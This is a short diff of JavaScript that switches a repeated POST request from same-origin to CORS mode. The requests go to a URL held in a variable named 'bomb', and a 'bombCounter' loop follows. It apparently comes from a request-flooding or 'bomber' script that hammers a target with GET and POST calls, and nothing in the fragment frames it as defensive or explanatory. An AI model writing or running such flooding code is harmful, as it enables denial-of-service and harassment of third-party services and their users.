@@ -147,7 +147,7 @@
 			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } });
 			fetch(req);
 			//fech POST
-			var req2 = new Request(bomb, { method: "POST", mode: "same-origin", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
 			fetch(req2);
 		}
 		bombCounter();
